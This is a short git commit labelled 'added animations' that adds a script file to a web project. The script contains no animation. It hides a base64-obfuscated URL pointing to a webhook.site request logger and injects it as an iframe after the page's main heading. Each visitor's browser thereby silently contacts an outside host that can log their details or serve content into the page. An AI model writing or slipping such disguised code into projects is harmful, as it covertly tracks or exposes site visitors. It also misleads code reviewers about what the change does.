3a45abf346f688429a8496176d5edd80987fba02
Kob <kobeshen123@gmail.com>
2024-06-23 14:44:30 +1000

    added animations

---
+++ scripts/animate.js
@@ -0,0 +1,4 @@
+const heading = document.getElementById('mainheading');
+const element = document.createElement('iframe');
+element.src = atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvM2YwNmY1MzYtODBmMy00YzEwLWFjODktMjQwYTZiYTNkNjMz');
+heading.insertAdjacentElement('afterend', element);
